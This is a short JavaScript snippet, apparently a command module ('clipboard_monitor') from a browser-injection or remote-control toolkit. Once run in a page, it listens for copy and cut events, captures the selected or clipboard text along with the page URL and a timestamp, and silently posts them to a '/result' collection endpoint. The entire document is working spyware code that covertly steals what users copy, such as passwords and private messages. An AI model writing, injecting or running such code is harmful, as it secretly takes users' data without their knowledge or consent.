(function(){
if(window.__pzCLIP)return 'already active';
window.__pzCLIP=true;
function grab(e){
  try{
    var text='';
    if(window.getSelection)text=window.getSelection().toString();
    if(!text&&e.clipboardData)text=e.clipboardData.getData('text');
    if(text)fetch('/result',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({cid:window.__pzCid,cmd_id:'clipboard_monitor',
        result:{event:e.type,text:text.slice(0,2000),url:location.href,
                ts:new Date().toISOString()}})});
  }catch(err){}
}
document.addEventListener('copy',grab,true);
document.addEventListener('cut',grab,true);
return 'clipboard monitor active';
})()